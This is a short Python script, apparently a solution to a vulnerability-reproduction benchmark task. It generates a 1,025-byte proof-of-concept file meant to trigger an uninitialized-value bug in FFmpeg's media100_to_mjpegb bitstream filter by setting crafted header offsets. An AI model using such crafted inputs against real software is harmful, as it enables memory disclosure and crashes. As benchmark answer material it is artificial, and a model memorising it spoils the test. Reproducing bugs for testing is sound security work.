import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is an uninitialized value usage in the output buffer padding 
        of the media100_to_mjpegb bitstream filter.
        To trigger it, we need to provide a valid Media 100 stream that successfully 
        produces an output packet.
        
        The filter reads offsets from the input buffer to locate fields. 
        We must ensure these offsets are valid (point within the input buffer).
        """
        # Ground-truth PoC length is 1025 bytes. We use this size to ensure 
        # any size-dependent allocation logic is satisfied.
        size = 1025
        data = bytearray(size)
        
        # The media100 header contains offsets at bytes 4, 8, and 12.
        # We set them to point to valid data regions within our buffer.
        # FFmpeg uses Big Endian for these fields.
        
        # Set Offset 1 to 64
        struct.pack_into(">I", data, 4, 64)
        
        # Set Offset 2 to 300
        struct.pack_into(">I", data, 8, 300)
        
        # Set Offset 3 to 600
        struct.pack_into(">I", data, 12, 600)
        
        # The rest of the buffer is zero-initialized, which acts as valid 
        # (black/empty) video data for the specified fields.
        
        return bytes(data)